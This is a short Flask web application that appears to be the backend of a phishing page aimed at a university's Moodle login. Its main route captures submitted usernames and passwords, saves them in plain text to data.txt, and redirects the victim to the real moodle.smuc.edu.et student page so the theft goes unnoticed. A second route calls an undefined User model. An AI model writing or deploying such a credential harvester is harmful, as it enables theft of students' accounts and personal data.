from flask import Flask, redirect, render_template, request
from sqlalchemy import null


app = Flask(__name__)

@app.route("/", methods= ["POST"] )
def main():
    if request.method == "POST":
        id = request.form.get('username')
        password = request.form.get("password")
        if(id == None):
            id = 'null'
        
        if(password == None):
            password = 'null'
        
        with open('data.txt', "w")as data:
            data.write(id)
            data.write('\n')
            data.write(password)
            data.write('\n')
        
        return redirect('moodle.smuc.edu.et/students/')

@app.route("/random")
def random():
    users = User.query.all()
    return render_template('users.html', users=users)
if __name__ == '__main__':

    app.run()
